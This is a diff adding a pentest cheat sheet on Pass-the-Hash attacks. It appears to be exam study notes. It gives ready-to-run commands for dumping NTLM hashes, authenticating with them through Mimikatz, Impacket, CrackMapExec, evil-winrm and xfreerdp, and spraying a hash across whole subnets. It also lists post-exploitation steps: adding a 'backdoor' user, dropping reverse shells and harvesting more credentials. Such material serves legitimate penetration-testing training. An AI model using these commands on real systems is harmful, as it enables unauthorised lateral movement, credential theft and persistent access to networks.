@@ -1,0 +1,130 @@
+🔐 WHAT IS PtH (Pass-the-Hash)?
+PtH lets you authenticate with a hash instead of a plaintext password. You’re not cracking it. You’re using it as-is — because NTLM authentication accepts a valid hash as proof of identity.
+
+⚠️ Hash = password for NTLM. If you got the hash, you got access.
+
+🧠 WHEN Can You Use PtH?
+Once you:
+
+🔓 Have admin rights on a box, and
+
+🪣 Extract NTLM hashes from:
+
+SAM (local user hashes)
+
+NTDS.dit (domain user hashes)
+
+lsass.exe (active session hashes via tools like Mimikatz)
+
+💣 Why PtH Still Works in 2025
+NTLM is still enabled for legacy compatibility.
+
+Most orgs haven’t fully disabled NTLM or configured mitigations like LAPS or Credential Guard.
+
+🛠️ TOOLS & WORKFLOWS
+🔧 1. Mimikatz (Windows - Direct Session Spawn)
+Uses the sekurlsa::pth module to spawn a shell as that user with only their hash.
+
+bash
+Copy
+Edit
+mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:<NTLM_HASH> /domain:inlanefreight.htb /run:cmd.exe"
+🚨 Must be run as admin on the box.
+
+🔧 2. Invoke-TheHash (Windows PowerShell)
+SMB or WMI-based command execution remotely.
+
+Works great for:
+
+Creating users
+
+Spawning reverse shells
+
+Testing access without GUI
+
+powershell
+Copy
+Edit
+Invoke-SMBExec -Target <IP> -Username <user> -Domain <domain> -Hash <NTLM> -Command "<your command>"
+Invoke-WMIExec ... # same syntax, different channel
+✅ No local admin rights needed on the attacker machine.
+❗ The account used must be admin on the target system.
+
+🔧 3. Impacket (Linux - Super Versatile)
+Perfect for Linux-based attackers or exam machines.
+
+✅ impacket-psexec
+Most classic — spawns a SYSTEM shell remotely.
+
+bash
+Copy
+Edit
+impacket-psexec administrator@<ip> -hashes :<ntlm>
+✅ impacket-wmiexec, atexec, smbexec
+Other options depending on port access or stealth required.
+
+🔧 4. CrackMapExec (Linux - Mass Spray + WinRM + SMB + Enumeration)
+Spray an NTLM hash across a subnet.
+
+Spot reused local admin hashes across hosts.
+
+bash
+Copy
+Edit
+crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>
+Add -x <cmd> to run a command if it hits. Add --local-auth if it's a local account hash.
+
+🔧 5. evil-winrm (Linux - Remote PowerShell with Hash)
+Auth via WinRM using a hash.
+
+Super stable and often exam-friendly.
+
+bash
+Copy
+Edit
+evil-winrm -i <IP> -u <user> -H <ntlm_hash>
+Works when WinRM is exposed and the account has admin rights.
+
+🔧 6. xfreerdp (GUI PtH via RDP - Linux)
+If the target allows RDP and Restricted Admin Mode is enabled:
+
+bash
+Copy
+Edit
+xfreerdp /v:<ip> /u:<user> /pth:<hash>
+🧱 Fails unless Restricted Admin is enabled on the target (rare in real life unless explicitly configured).
+
+🧠 TACTICAL NOTES
+✅ Domain Account = Lateral Movement Gold
+Admin on multiple machines? PtH lets you pivot host-to-host.
+
+CrackMapExec and Impacket tools are perfect for quick access confirmation.
+
+⚠️ UAC Blockers
+If LocalAccountTokenFilterPolicy is set to block local admin remote usage, even RID-500 can be blocked unless that registry key is set correctly.
+
+🧨 Common Real-World Weakness
+Shared local admin passwords reused across fleet → PtH works on all.
+
+Use CME to spray and spot it fast.
+
+bash
+Copy
+Edit
+crackmapexec smb 10.0.0.0/24 -u Administrator -H <hash> --local-auth
+🧰 Post-Ex Tips
+Once PtH works:
+
+Deploy a user (net user backdoor P@ss /add)
+
+Drop a reverse shell (PowerShell, MSBuild, or Nishang-based)
+
+Harvest more hashes from the new box (lsass, mimikatz, ProcDump)
+
+✅ TL;DR: EXAM & REAL WORLD
+Use Case	Tool	Platform
+Spawn shell on compromised box	mimikatz sekurlsa::pth	Windows
+Remote cmd with hash	Invoke-TheHash (SMB/WMI)	Windows
+Shell from Linux	impacket-psexec / evil-winrm	Linux
+Subnet-wide admin test	CrackMapExec	Linux
+GUI Access	xfreerdp + /pth	Linux
